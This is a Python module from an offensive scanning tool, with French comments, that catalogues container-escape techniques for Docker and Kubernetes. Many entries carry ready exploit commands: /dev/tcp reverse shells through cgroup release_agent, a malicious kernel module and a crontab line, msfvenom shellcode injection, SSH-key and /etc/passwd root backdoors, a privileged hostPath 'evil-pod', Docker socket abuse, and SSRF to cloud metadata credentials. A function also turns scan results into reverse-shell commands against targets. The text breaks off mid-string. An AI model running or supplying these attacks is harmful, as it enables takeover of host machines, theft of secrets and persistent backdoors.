"""
ChocoScan — Container Escape.

Checklist complète de détection et d'évasion de conteneurs
pour les environnements Docker, LXC, et Kubernetes.

Deux modes :
  1. Analyse du scan réseau : détecte si la cible est un hôte
     de conteneurs (Docker API 2375/2376, K8s 6443, Kubelet 10250)
     et génère les commandes d'attaque externe.
  2. Checklist shell : commandes à exécuter depuis l'intérieur du
     conteneur pour identifier les vecteurs d'évasion.

Vecteurs couverts :
  Détection       — .dockerenv, cgroups, namespaces, env vars
  Capabilities    — CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_DAC_READ_SEARCH, etc.
  Docker socket   — /var/run/docker.sock, DOCKER_HOST, API TCP 2375
  Montages        — host FS, /dev, /proc/host, volumes K8s hostPath
  Cgroups v1      — release_agent RCE (privilege escalation → root → escape)
  Privileged      — nsenter, /dev/sda, fdisk/mount
  Kubernetes      — serviceaccount token, RBAC, kubelet API, SSRF metadata
  CVEs connues    — runc CVE-2019-5736, containerd CVE-2020-15257

Référence : book.hacktricks.xyz/cloud-security/pentesting-kubernetes
            book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security
Développé par Kinder-Bueno (Mathys CASTELLA)
"""

from __future__ import annotations

from dataclasses import dataclass, field


# ── Modèles ───────────────────────────────────────────────────────────────────

@dataclass
class ContainerCheck:
    title:       str
    category:    str    # detect | capability | socket | mount | escape | kubernetes | cve
    description: str
    check_cmd:   str    # Commande pour vérifier si vulnérable
    exploit_cmd: str    # Commande d'exploitation si vulnérable
    severity:    str = "high"   # critical | high | medium | low
    reference:   str = ""
    difficulty:  str = "medium"  # easy | medium | hard
    notes:       list[str] = field(default_factory=list)


@dataclass
class ContainerExternalCheck:
    title:       str
    description: str
    command:     str    # Commande à lancer depuis Kali (externe)
    severity:    str = "high"
    notes:       list[str] = field(default_factory=list)


# ── Détection — Suis-je dans un conteneur ? ───────────────────────────────────

DETECT_CHECKS: list[ContainerCheck] = [

    ContainerCheck(
        title="Fichier .dockerenv",
        category="detect",
        description="Présence de /.dockerenv — signe certain d'un conteneur Docker.",
        check_cmd="ls -la /.dockerenv 2>/dev/null && echo 'DOCKER CONTAINER'",
        exploit_cmd="# Confirme le contexte — passer aux vérifications d'évasion",
        severity="low",
        difficulty="easy",
    ),

    ContainerCheck(
        title="cgroups — Docker / LXC dans /proc/1/cgroup",
        category="detect",
        description="Le fichier /proc/1/cgroup contient 'docker', 'kubepods' ou 'lxc'.",
        check_cmd=(
            "cat /proc/1/cgroup\n"
            "# Chercher : docker, kubepods, containerd, lxc\n"
            "grep -qiE 'docker|kubepods|containerd|lxc' /proc/1/cgroup "
            "&& echo 'CONTAINER DETECTED'"
        ),
        exploit_cmd="# Confirme le runtime — adapter les techniques d'évasion",
        severity="low",
        difficulty="easy",
    ),

    ContainerCheck(
        title="Namespace PID 1 — processus init vs systemd",
        category="detect",
        description=(
            "Dans un conteneur, le PID 1 est souvent sh/bash/python, "
            "pas systemd/init. Indique un espace de nom PID isolé."
        ),
        check_cmd=(
            "cat /proc/1/comm\n"
            "ls -la /proc/1/exe\n"
            "# Si PID 1 ≠ systemd/init → conteneur probable"
        ),
        exploit_cmd="# Confirme le contexte",
        severity="low",
        difficulty="easy",
    ),

    ContainerCheck(
        title="Variables d'environnement caractéristiques",
        category="detect",
        description=(
            "Les conteneurs Docker/K8s injectent des variables spécifiques : "
            "KUBERNETES_SERVICE_HOST, DOCKER_HOST, container=docker, etc."
        ),
        check_cmd=(
            "env | grep -iE 'KUBERNETES|DOCKER|CONTAINER|K8S|POD_NAME|NAMESPACE'\n"
            "cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | "
            "grep -iE 'KUBERNETES|DOCKER|POD'"
        ),
        exploit_cmd=(
            "# Si KUBERNETES_SERVICE_HOST présent → pod K8s\n"
            "# Si DOCKER_HOST présent → accès à un daemon Docker"
        ),
        severity="low",
        difficulty="easy",
    ),

    ContainerCheck(
        title="Hostname — format container ID",
        category="detect",
        description="Le hostname d'un conteneur Docker est souvent l'ID du conteneur (12 hex).",
        check_cmd=(
            "hostname\n"
            "cat /etc/hostname\n"
            "# Un hostname de 12 chars hexadécimaux = container ID"
        ),
        exploit_cmd="# Confirme le contexte",
        severity="low",
        difficulty="easy",
    ),
]


# ── Capabilities dangereuses ──────────────────────────────────────────────────

CAPABILITY_CHECKS: list[ContainerCheck] = [

    ContainerCheck(
        title="CAP_SYS_ADMIN — la capability fourre-tout",
        category="capability",
        description=(
            "CAP_SYS_ADMIN est la plus dangereuse. Elle permet : "
            "mount/umount, modification des namespaces, "
            "écriture dans les cgroups release_agent (→ RCE host), "
            "et bien plus. Souvent présente dans les conteneurs privilégiés."
        ),
        check_cmd=(
            "# Vérifier les capabilities du process courant :\n"
            "cat /proc/self/status | grep -i cap\n"
            "capsh --decode=$(cat /proc/self/status | grep CapEff | awk '{print $2}')\n\n"
            "# Ou directement :\n"
            "capsh --print | grep cap_sys_admin"
        ),
        exploit_cmd=(
            "# ── Méthode 1 : cgroups v1 release_agent (shell sur l'hôte) ──────\n"
            "# 1. Créer un cgroup\n"
            "mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp\n"
            "mkdir /tmp/cgrp/x\n"
            "# 2. Activer notify_on_release\n"
            "echo 1 > /tmp/cgrp/x/notify_on_release\n"
            "# 3. Trouver le chemin du conteneur sur l'hôte\n"
            "host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)\n"
            "# 4. Écrire le payload (reverse shell vers LHOST:LPORT)\n"
            "echo \"#!/bin/sh\" > /cmd\n"
            "echo \"bash -i >& /dev/tcp/LHOST/LPORT 0>&1\" >> /cmd\n"
            "chmod +x /cmd\n"
            "echo \"$host_path/cmd\" > /tmp/cgrp/release_agent\n"
            "# 5. Déclencher l'exécution\n"
            "sh -c 'echo $$ > /tmp/cgrp/x/cgroup.procs'\n\n"
            "# ── Méthode 2 : mount + nsenter ──────────────────────────────────\n"
            "# Si le namespace PID n'est pas isolé :\n"
            "nsenter --target 1 --mount --uts --ipc --net --pid -- bash"
        ),
        severity="critical",
        reference="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#cap_sys_admin",
        difficulty="medium",
        notes=[
            "Fonctionne avec cgroups v1 seulement — vérifier : stat -fc %T /sys/fs/cgroup",
            "PoC automatisé : https://github.com/stealthcopter/deepce",
        ],
    ),

    ContainerCheck(
        title="CAP_SYS_PTRACE — injection dans un processus hôte",
        category="capability",
        description=(
            "Permet d'attacher ptrace à n'importe quel processus. "
            "Si le namespace PID est partagé avec l'hôte, "
            "on peut injecter du shellcode dans un processus root de l'hôte."
        ),
        check_cmd=(
            "# Vérifier la capability :\n"
            "capsh --print | grep cap_sys_ptrace\n\n"
            "# Vérifier si le namespace PID est partagé avec l'hôte :\n"
            "ls -la /proc/1/exe  # → si pointe vers systemd = PID partagé\n"
            "cat /proc/1/comm    # → 'systemd' ou 'init' = namespace partagé"
        ),
        exploit_cmd=(
            "# Injection de shellcode dans un processus root via ptrace :\n"
            "# Outil : https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject\n\n"
            "# 1. Lister les processus root :\n"
            "ps aux | grep -E '^root'\n\n"
            "# 2. Générer shellcode msfvenom :\n"
            "msfvenom -p linux/x64/shell_reverse_tcp "
            "LHOST=LHOST LPORT=LPORT -f c\n\n"
            "# 3. Compiler et exécuter mem_inject avec PID cible :\n"
            "gcc inject.c -o inject\n"
            "./inject PID_ROOT_PROCESS"
        ),
        severity="critical",
        reference="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_ptrace",
        difficulty="hard",
        notes=["Nécessite PID namespace partagé avec l'hôte — peu fréquent"],
    ),

    ContainerCheck(
        title="CAP_DAC_READ_SEARCH — lecture arbitraire de fichiers hôte",
        category="capability",
        description=(
            "Permet de lire n'importe quel fichier du système de fichiers hôte "
            "via un appel open_by_handle_at() avec un file handle bruteforcé. "
            "Technique 'Shocker attack'."
        ),
        check_cmd=(
            "capsh --print | grep cap_dac_read_search\n"
            "# Ou depuis /proc :\n"
            "cat /proc/self/status | grep CapEff"
        ),
        exploit_cmd=(
            "# Attaque Shocker — lire /etc/shadow de l'hôte :\n"
            "# Compiler shocker.c :\n"
            "# https://raw.githubusercontent.com/gabrtv/shocker/master/shocker.c\n"
            "gcc shocker.c -o shocker\n"
            "./shocker  # Lit /etc/shadow de l'hôte\n\n"
            "# Version Python :\n"
            "# https://github.com/carlospolop/hacktricks/blob/master/linux-hardening/"
            "privilege-escalation/docker-security/docker-breakout-privilege-escalation.md"
        ),
        severity="high",
        reference="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_dac_read_search",
        difficulty="hard",
        notes=["PoC shocker : https://github.com/gabrtv/shocker"],
    ),

    ContainerCheck(
        title="CAP_SYS_MODULE — chargement de module kernel",
        category="capability",
        description=(
            "Permet de charger un module kernel malveillant. "
            "Équivaut à un accès root complet sur l'hôte si les modules "
            "ne sont pas signés."
        ),
        check_cmd=(
            "capsh --print | grep cap_sys_module\n"
            "# Vérifier si les modules non signés sont acceptés :\n"
            "cat /proc/sys/kernel/modules_disabled"
        ),
        exploit_cmd=(
            "# Créer un LKM (Loadable Kernel Module) malveillant :\n"
            "cat > reverse_shell.c << 'EOF'\n"
            "#include <linux/kmod.h>\n"
            "#include <linux/module.h>\n"
            "MODULE_LICENSE(\"GPL\");\n"
            "static int init(void) {\n"
            "  char *argv[] = {\"/bin/bash\", \"-c\","
            " \"bash -i >& /dev/tcp/LHOST/LPORT 0>&1\", NULL};\n"
            "  char *envp[] = {\"PATH=/bin:/sbin:/usr/bin:/usr/sbin\", NULL};\n"
            "  call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);\n"
            "  return 0;\n"
            "}\n"
            "module_init(init);\n"
            "EOF\n"
            "make -C /lib/modules/$(uname -r)/build M=$PWD modules\n"
            "insmod reverse_shell.ko"
        ),
        severity="critical",
        reference="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_module",
        difficulty="hard",
    ),

    ContainerCheck(
        title="CAP_NET_ADMIN — reniflage réseau et ARP spoofing",
        category="capability",
        description=(
            "Permet de configurer les interfaces réseau, les règles iptables, "
            "l'ARP spoofing. Utile pour intercepter le trafic d'autres conteneurs "
            "ou de l'hôte si le réseau est partagé."
        ),
        check_cmd=(
            "capsh --print | grep cap_net_admin\n"
            "ip link  # Vérifier les interfaces disponibles\n"
            "ip route # Voir le routage"
        ),
        exploit_cmd=(
            "# ARP spoofing pour MitM entre conteneurs :\n"
            "arpspoof -i eth0 -t TARGET_IP GATEWAY_IP\n\n"
            "# Sniffer le trafic :\n"
            "tcpdump -i eth0 -w /tmp/capture.pcap\n\n"
            "# Règles iptables pour rediriger le trafic :\n"
            "iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080"
        ),
        severity="medium",
        difficulty="medium",
    ),

    ContainerCheck(
        title="Conteneur Privileged — --privileged flag",
        category="capability",
        description=(
            "Le flag --privileged donne TOUTES les capabilities + accès à tous "
            "les devices /dev + désactive AppArmor/SELinux. "
            "Évasion triviale via montage du disque hôte ou nsenter."
        ),
        check_cmd=(
            "# Méthode 1 : vérifier CapEff (toutes les capabilities = privileged)\n"
            "cat /proc/self/status | grep CapEff\n"
            "# 0000003fffffffff = toutes les caps → privileged\n\n"
            "# Méthode 2 : accès au device hôte\n"
            "ls /dev/sda* 2>/dev/null && echo 'PRIVILEGED CONTAINER'\n\n"
            "# Méthode 3 : appinfo (si disponible)\n"
            "cat /proc/self/cgroup | grep docker\n"
            "curl -s --unix-socket /var/run/docker.sock "
            "http://localhost/containers/$(hostname)/json "
            "2>/dev/null | python3 -m json.tool | grep Privileged"
        ),
        exploit_cmd=(
            "# ── Méthode 1 : nsenter (si PID namespace partagé) ─────────────\n"
            "nsenter --target 1 --mount --uts --ipc --net --pid -- bash\n\n"
            "# ── Méthode 2 : monter le disque hôte ──────────────────────────\n"
            "# Lister les disques hôte :\n"
            "fdisk -l 2>/dev/null\n"
            "# Monter la partition racine :\n"
            "mkdir -p /mnt/host\n"
            "mount /dev/sda1 /mnt/host\n"
            "chroot /mnt/host /bin/bash\n\n"
            "# ── Méthode 3 : écrire une clé SSH dans /root de l'hôte ─────────\n"
            "mkdir -p /mnt/host/root/.ssh\n"
            "echo 'ssh-rsa AAAA... kali@kali' >> /mnt/host/root/.ssh/authorized_keys\n"
            "ssh root@HOST_IP\n\n"
            "# ── Méthode 4 : cgroups v1 release_agent (voir CAP_SYS_ADMIN) ──"
        ),
        severity="critical",
        reference="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-privileged",
        difficulty="easy",
        notes=[
            "deepce.sh automatise la détection : "
            "curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh | sh",
        ],
    ),
]


# ── Docker Socket ─────────────────────────────────────────────────────────────

SOCKET_CHECKS: list[ContainerCheck] = [

    ContainerCheck(
        title="/var/run/docker.sock — écriture directe sur l'hôte",
        category="socket",
        description=(
            "Si le socket Docker est monté dans le conteneur et accessible en écriture, "
            "on peut créer un nouveau conteneur privilégié avec montage du FS hôte "
            "→ évasion immédiate."
        ),
        check_cmd=(
            "ls -la /var/run/docker.sock 2>/dev/null\n"
            "# Vérifier l'accès :\n"
            "docker ps 2>/dev/null || curl -s --unix-socket /var/run/docker.sock "
            "http://localhost/version"
        ),
        exploit_cmd=(
            "# ── Via docker CLI (si disponible) ────────────────────────────\n"
            "docker run -v /:/host --rm -it alpine chroot /host /bin/bash\n\n"
            "# ── Via curl + API Docker (si docker absent) ───────────────────\n"
            "# 1. Récupérer une image disponible :\n"
            "curl -s --unix-socket /var/run/docker.sock "
            "http://localhost/images/json | python3 -m json.tool | grep RepoTags\n\n"
            "# 2. Créer le conteneur :\n"
            "curl -s --unix-socket /var/run/docker.sock "
            "-X POST -H 'Content-Type: application/json' "
            "http://localhost/containers/create "
            "-d '{\"Image\":\"IMAGE_NAME\",\"Cmd\":[\"/bin/sh\"],"
            "\"Binds\":[\"/:/host\"],\"Privileged\":true}'\n\n"
            "# 3. Démarrer + attacher :\n"
            "curl -s --unix-socket /var/run/docker.sock "
            "-X POST http://localhost/containers/CONTAINER_ID/start\n"
            "# Ou utiliser nsenter depuis le container créé\n\n"
            "# ── Via GTFO ───────────────────────────────────────────────────\n"
            "# https://gtfobins.github.io/gtfobins/docker/"
        ),
        severity="critical",
        reference="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-socket-escape",
        difficulty="easy",
        notes=[
            "Vérifier aussi DOCKER_HOST env var → docker -H $DOCKER_HOST ps",
            "curl fonctionne si docker CLI absent",
        ],
    ),

    ContainerCheck(
        title="DOCKER_HOST env var — daemon Docker distant",
        category="socket",
        description="La variable DOCKER_HOST pointe vers un daemon Docker distant ou local accessible.",
        check_cmd=(
            "echo $DOCKER_HOST\n"
            "env | grep DOCKER"
        ),
        exploit_cmd=(
            "docker -H $DOCKER_HOST run -v /:/host --rm -it alpine chroot /host /bin/bash"
        ),
        severity="critical",
        difficulty="easy",
    ),
]


# ── Montages sensibles ────────────────────────────────────────────────────────

MOUNT_CHECKS: list[ContainerCheck] = [

    ContainerCheck(
        title="Montage du système de fichiers hôte",
        category="mount",
        description=(
            "Des répertoires hôte sensibles montés dans le conteneur "
            "(/host, /hostfs, /etc, /root, /var) permettent d'accéder "
            "directement au FS de l'hôte ou d'écrire des backdoors."
        ),
        check_cmd=(
            "# Lister tous les montages :\n"
            "cat /proc/mounts\n"
            "mount | grep -v 'type tmpfs\\|type cgroup\\|type proc\\|type sysfs\\|type devpts'\n\n"
            "# Chercher les volumes hostPath suspects :\n"
            "df -h | grep -v 'tmpfs\\|overlay'\n"
            "ls /host /hostfs /mnt/host 2>/dev/null"
        ),
        exploit_cmd=(
            "# Si /host ou similaire monté → accès direct au FS hôte :\n"
            "chroot /host /bin/bash\n\n"
            "# Écrire une clé SSH dans /root de l'hôte :\n"
            "mkdir -p /host/root/.ssh\n"
            "echo 'VOTRE_CLE_SSH' >> /host/root/.ssh/authorized_keys\n\n"
            "# Ajouter un crontab :\n"
            "echo '* * * * * root bash -i >& /dev/tcp/LHOST/LPORT 0>&1' "
            ">> /host/etc/crontab\n\n"
            "# Écrire un SUID shell :\n"
            "cp /bin/bash /host/tmp/rootbash\n"
            "chmod +s /host/tmp/rootbash\n"
            "# Depuis l'hôte : /tmp/rootbash -p"
        ),
        severity="critical",
        difficulty="easy",
    ),

    ContainerCheck(
        title="/dev monté — accès aux devices hôte",
        category="mount",
        description=(
            "Si /dev est monté avec les devices hôte, "
            "on peut accéder directement aux disques (/dev/sda) "
            "ou à la mémoire (/dev/mem)."
        ),
        check_cmd=(
            "ls /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null\n"
            "cat /proc/mounts | grep '^/dev'"
        ),
        exploit_cmd=(
            "# Monter le disque racine de l'hôte :\n"
            "fdisk -l /dev/sda 2>/dev/null\n"
            "mkdir -p /mnt/host\n"
            "mount /dev/sda1 /mnt/host\n"
            "chroot /mnt/host /bin/bash"
        ),
        severity="critical",
        difficulty="easy",
    ),

    ContainerCheck(
        title="/proc/sysrq-trigger — crash ou reboot de l'hôte",
        category="mount",
        description=(
            "Accès en écriture à /proc/sysrq-trigger permet d'envoyer "
            "des commandes kernel (reboot, crash, dump). "
            "Peut aussi permettre de modifier des paramètres kernel."
        ),
        check_cmd=(
            "ls -la /proc/sysrq-trigger 2>/dev/null\n"
            "cat /proc/sys/kernel/sysrq"
        ),
        exploit_cmd=(
            "# Reboot de l'hôte :\n"
            "echo b > /proc/sysrq-trigger\n\n"
            "# Killer tous les processus (sauf init) :\n"
            "echo i > /proc/sysrq-trigger\n\n"
            "# NOTE : impact direct sur l'hôte — utiliser avec précaution en CTF"
        ),
        severity="medium",
        difficulty="easy",
    ),

    ContainerCheck(
        title="Répertoires sensibles montés en écriture",
        category="mount",
        description=(
            "Des répertoires comme /etc/crontab, /root/.ssh, /etc/passwd, "
            "/usr/local/bin montés depuis l'hôte permettent la persistance "
            "ou l'élévation de privilèges."
        ),
        check_cmd=(
            "# Fichiers de config montés depuis l'hôte :\n"
            "cat /proc/mounts | grep -E '/etc|/root|/home|/usr/local/bin'\n\n"
            "# Vérifier les droits en écriture :\n"
            "find / -maxdepth 4 -type d -writable 2>/dev/null | "
            "grep -v '^/proc\\|^/sys\\|^/tmp\\|^/dev\\|^/run'"
        ),
        exploit_cmd=(
            "# Si /etc est writable → modifier /etc/passwd (ajouter root) :\n"
            "echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /etc/passwd\n\n"
            "# Si /root/.ssh est monté → ajouter une clé :\n"
            "echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys"
        ),
        severity="high",
        difficulty="easy",
    ),
]


# ── Kubernetes ────────────────────────────────────────────────────────────────

KUBERNETES_CHECKS: list[ContainerCheck] = [

    ContainerCheck(
        title="ServiceAccount token — authentification K8s",
        category="kubernetes",
        description=(
            "Chaque pod K8s reçoit un serviceaccount token JWT. "
            "Selon les permissions RBAC du serviceaccount, "
            "ce token peut permettre d'exécuter des commandes dans d'autres pods "
            "ou de lire des secrets sensibles."
        ),
        check_cmd=(
            "# Vérifier la présence du token :\n"
            "ls /var/run/secrets/kubernetes.io/serviceaccount/\n"
            "cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d. -f2 | "
            "base64 -d 2>/dev/null | python3 -m json.tool\n\n"
            "# Variables d'env K8s :\n"
            "env | grep KUBERNETES\n"
            "# → KUBERNETES_SERVICE_HOST, KUBERNETES_SERVICE_PORT"
        ),
        exploit_cmd=(
            "# Définir les variables depuis le pod :\n"
            "APISERVER=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT\n"
            "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\n"
            "CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\n"
            "NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)\n\n"
            "# Lister les permissions du serviceaccount :\n"
            "curl -s $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews "
            "--cacert $CACERT -H \"Authorization: Bearer $TOKEN\"\n\n"
            "# Lister les pods :\n"
            "curl -s $APISERVER/api/v1/namespaces/$NAMESPACE/pods "
            "--cacert $CACERT -H \"Authorization: Bearer $TOKEN\"\n\n"
            "# Lister les secrets :\n"
            "curl -s $APISERVER/api/v1/namespaces/$NAMESPACE/secrets "
            "--cacert $CACERT -H \"Authorization: Bearer $TOKEN\"\n\n"
            "# Si kubectl disponible :\n"
            "kubectl auth can-i --list --token=$TOKEN"
        ),
        severity="high",
        reference="https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes",
        difficulty="medium",
        notes=[
            "RBAC permissif → exec dans d'autres pods, création de pods privilégiés",
            "Namespace kube-system → accès aux secrets de configuration du cluster",
        ],
    ),

    ContainerCheck(
        title="Création de pod privilégié via l'API K8s",
        category="kubernetes",
        description=(
            "Si le serviceaccount a le droit de créer des pods, "
            "on peut créer un pod privilégié avec montage du FS hôte → "
            "évasion vers le nœud."
        ),
        check_cmd=(
            "# Vérifier le droit de créer des pods :\n"
            "kubectl auth can-i create pods --token=$TOKEN 2>/dev/null\n"
            "# Ou via l'API :\n"
            "curl -s $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews "
            "-X POST --cacert $CACERT -H \"Authorization: Bearer $TOKEN\" "
            "-H 'Content-Type: application/json' "
            "-d '{\"apiVersion\":\"authorization.k8s.io/v1\","
            "\"kind\":\"SelfSubjectAccessReview\","
            "\"spec\":{\"resourceAttributes\":{\"namespace\":\"default\","
            "\"verb\":\"create\",\"resource\":\"pods\"}}}'"
        ),
        exploit_cmd=(
            "# Créer un pod privilégié avec montage du FS hôte :\n"
            "cat > /tmp/evil_pod.yaml << 'EOF'\n"
            "apiVersion: v1\n"
            "kind: Pod\n"
            "metadata:\n"
            "  name: evil-pod\n"
            "spec:\n"
            "  hostPID: true\n"
            "  hostIPC: true\n"
            "  hostNetwork: true\n"
            "  containers:\n"
            "  - name: evil\n"
            "    image: ubuntu\n"
            "    securityContext:\n"
            "      privileged: true\n"
            "    volumeMounts:\n"
            "    - mountPath: /host\n"
            "      name: host-vol\n"
            "    command: ['nsenter', '--target', '1', "
            "'--mount', '--uts', '--ipc', '--net', '--pid', '--', 'bash']\n"
            "  volumes:\n"
            "  - name: host-vol\n"
            "    hostPath:\n"
            "      path: /\n"
            "EOF\n"
            "kubectl apply -f /tmp/evil_pod.yaml --token=$TOKEN\n"
            "kubectl exec -it evil-pod -- chroot /host /bin/bash --token=$TOKEN"
        ),
        severity="critical",
        difficulty="medium",
        notes=["Nettoyer : kubectl delete pod evil-pod --token=$TOKEN"],
    ),

    ContainerCheck(
        title="SSRF vers l'API Kubernetes (169.254.x.x ou 10.x.x.x)",
        category="kubernetes",
        description=(
            "Depuis un pod, l'API K8s est accessible via KUBERNETES_SERVICE_HOST. "
            "En cas de SSRF dans une application du pod, on peut "
            "interagir avec l'API cluster depuis l'extérieur."
        ),
        check_cmd=(
            "env | grep KUBERNETES_SERVICE_HOST\n"
            "# Valeur typique : 10.96.0.1\n"
            "curl -k https://$KUBERNETES_SERVICE_HOST:443/version"
        ),
        exploit_cmd=(
            "# Via SSRF externe → accès à l'API K8s interne :\n"
            "# URL à injecter dans le paramètre SSRF :\n"
            "https://10.96.0.1:443/api/v1/namespaces/default/secrets\n\n"
            "# Avec le token du pod (si accessible depuis SSRF) :\n"
            "# Header : Authorization: Bearer TOKEN\n\n"
            "# Récupérer le token via SSRF sur les métadonnées cloud :\n"
            "# AWS EKS : http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
            "# GKE : http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
        ),
        severity="high",
        difficulty="medium",
    ),
]


# ── CVEs connues ──────────────────────────────────────────────────────────────

CVE_CHECKS: list[ContainerCheck] = [

    ContainerCheck(
        title="CVE-2019-5736 — runc overwrite (Docker < 18.09.2)",
        category="cve",
        description=(
            "Vulnérabilité dans runc permettant à un processus dans le conteneur "
            "d'écraser le binaire runc de l'hôte via /proc/self/exe. "
            "Déclenché lors du prochain 'docker exec' ou 'docker run'."
        ),
        check_cmd=(
            "# Vérifier la version Docker sur la cible :\n"
            "runc --version 2>/dev/null || docker --version\n"
            "# Vulnérable si runc < 1.0-rc6 / Docker < 18.09.2"
        ),
        exploit_cmd=(
            "# PoC : https://github.com/Frichetten/CVE-2019-5736-PoC\n"
            "# 1. Modifier le payload dans main.go (reverse shell)\n"
            "# 2. Compiler : go build\n"
            "# 3. Exécuter dans le conteneur (attendre un docker exec depuis l'hôte)\n"
            "./CVE-2019-5736"
        ),
        severity="critical",
        reference="https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/",
        difficulty="hard",
        notes=["Nécessite que l'administrateur exécute docker exec depuis l'hôte"],
    ),

    ContainerCheck(
        title="CVE-2020-15257 — containerd (Shim API exposure)",
        category="cve",
        description=(
            "Les conteneurs partageant le namespace réseau de l'hôte "
            "peuvent accéder au socket Unix du containerd shim "
            "et élever leurs privilèges."
        ),
        check_cmd=(
            "# Vérifier la version de containerd :\n"
            "containerd --version 2>/dev/null\n"
            "# Vulnérable si containerd < 1.3.9 ou < 1.4.3\n\n"
            "# Vérifier si le réseau est partagé avec l'hôte :\n"
            "cat /proc/net/unix | grep containerd"
        ),
        exploit_cmd=(
            "# PoC : https://github.com/NVIDIAIALab/cve-2020-15257\n"
            "# Nécessite réseau partagé avec l'hôte (--network host)"
        ),
        severity="high",
        reference="https://research.nccgroup.com/2020/12/10/abstract-shimmer-cve-2020-15257-host-networking-is-root-equivalent-again/",
        difficulty="hard",
    ),
]


# ── Scan externe — services détectés sur l'hôte ──────────────────────────────

def analyze_container_host(results: list[dict], lhost: str = "LHOST") -> list[ContainerExternalCheck]:
    """
    Analyse le scan réseau et génère des commandes d'attaque externe
    si des services de conteneurs sont détectés.

    Args:
        results: Résultats ChocoScan.
        lhost:   IP de l'attaquant.

    Returns:
        Liste de ContainerExternalCheck pour les services détectés.
    """
    checks: list[ContainerExternalCheck] = []

    for r in results:
        svc = r.get("service", {})
        port = svc.get("port", 0) or 0
        host = svc.get("host", "TARGET") or "TARGET"
        svc_name = (svc.get("service_name", "") or "").lower()
        banner = (svc.get("banner", "") or "").lower()

        # ── Docker API non authentifiée (2375) ────────────────────────────────
        if port == 2375 or ("docker" in svc_name and "2375" in str(port)):
            checks.append(ContainerExternalCheck(
                title=f"Docker API TCP exposée — {host}:2375 (non authentifiée)",
                description=(
                    "L'API Docker est accessible sans TLS. "
                    "Accès total au daemon Docker → création de conteneurs privilégiés → RCE hôte."
                ),
                command=(
                    f"# Vérifier la version :\n"
                    f"curl -s http://{host}:2375/version | python3 -m json.tool\n\n"
                    f"# Lister les conteneurs :\n"
                    f"docker -H tcp://{host}:2375 ps -a\n\n"
                    f"# RCE via conteneur privilégié :\n"
                    f"docker -H tcp://{host}:2375 run -v /:/host --rm -it alpine chroot /host /bin/bash\n\n"
                    f"# Reverse shell depuis le conteneur :\n"
                    f"docker -H tcp://{host}:2375 run --rm -it alpine "
                    f"ash -c 'ash -i >& /dev/tcp/{lhost}/4444 0>&1'"
                ),
                severity="critical",
                notes=["Docker API sans TLS = RCE directe sur l'hôte"],
            ))

        # ── Docker API TLS (2376) ─────────────────────────────────────────────
        if port == 2376:
            checks.append(ContainerExternalCheck(
                title=f"Docker API TLS — {host}:2376",
                description="API Docker avec TLS. Nécessite un certificat client valide.",
                command=(
                    f"# Tester sans certificat :\n"
                    f"curl -sk https://{host}:2376/version\n\n"
                    f"# Avec certificat client (si récupéré) :\n"
                    f"curl -s https://{host}:2376/version "
                    f"--cert cert.pem --key key.pem --cacert ca.pem"
                ),
                severity="high",
                notes=["Chercher les certificats dans ~/.docker/ ou /etc/docker/"],
            ))

        # ── Kubernetes API Server (6443) ──────────────────────────────────────
        if port == 6443 or ("kubernetes" in svc_name and port in (6443, 8443)):
            checks.append(ContainerExternalCheck(
                title=f"Kubernetes API Server — {host}:6443",
                description=(
                    "L'API K8s est exposée. "
                    "Tenter une accès anonyme ou avec un token récupéré."
                ),
                command=(
                    f"# Accès anonyme :\n"
                    f"curl -sk https://{host}:6443/version\n"
                    f"curl -sk https://{host}:6443/api/v1/namespaces\n\n"
                    f"# Avec un token JWT (serviceaccount ou admin) :\n"
                    f"curl -sk https://{host}:6443/api/v1/pods "
                    f"-H 'Authorization: Bearer TOKEN'\n\n"
                    f"# kubectl :\n"
                    f"kubectl --server=https://{host}:6443 --insecure-skip-tls-verify "
                    f"--token=TOKEN get pods -A"
                ),
                severity="critical",
                notes=["Accès anonyme souvent désactivé depuis K8s 1.20+"],
            ))

        # ── Kubelet API (10250) ───────────────────────────────────────────────
        if port == 10250:
            checks.append(ContainerExternalCheck(
                title=f"Kubernetes Kubelet API — {host}:10250",
                description=(
                    "Le Kubelet expose une API REST. "
                    "Si l'authentification est désactivée, exécution de commandes "
                    "dans tous les pods du nœud."
                ),
                command=(
                    f"# Lister les pods du nœud :\n"
                    f"curl -sk https://{host}:10250/pods | python3 -m json.tool\n\n"
                    f"# Exécuter une commande dans un pod (nom depuis la liste ci-dessus) :\n"
                    f"curl -sk https://{host}:10250/run/NAMESPACE/POD_NAME/CONTAINER_NAME "
                    f"-d 'cmd=id'\n\n"
                    f"# Shell interactif :\n"
                    f"curl -sk https://{host}:10250/exec/NAMESPACE/POD_NAME/CONTAINER_NAME"
                    f"?command=bash&input=1&output=1&tty=1"
